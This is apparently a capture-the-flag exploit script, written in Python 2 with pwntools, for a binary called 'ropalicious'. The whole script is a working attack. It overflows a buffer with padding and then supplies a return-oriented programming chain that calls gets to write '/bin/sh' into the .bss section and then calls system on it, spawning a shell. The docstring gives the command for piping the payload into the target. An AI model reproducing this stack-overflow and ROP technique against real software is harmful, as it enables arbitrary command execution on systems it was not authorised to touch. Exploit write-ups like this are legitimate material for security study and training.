#!/usr/bin/python2

"""
    ROPalicious payload generation
    2015-11-01
    ROT

    strace -fi
    bash -c "(cat shell; cat) | ./ropalicious"
"""

import sys
from pwn import p32, flat

system_addr = 0x8048330
bss = 0x080497b8
pop_ret = 0x8048546
gets_addr = 0x8048310

sys.stdout.write('y')
sys.stdout.write(75*'A')
sys.stdout.write(flat(
    gets_addr,
    pop_ret,
    bss,
    system_addr,
    'AAAA',
    bss,
    '\n',
    '/bin/sh\n',
))
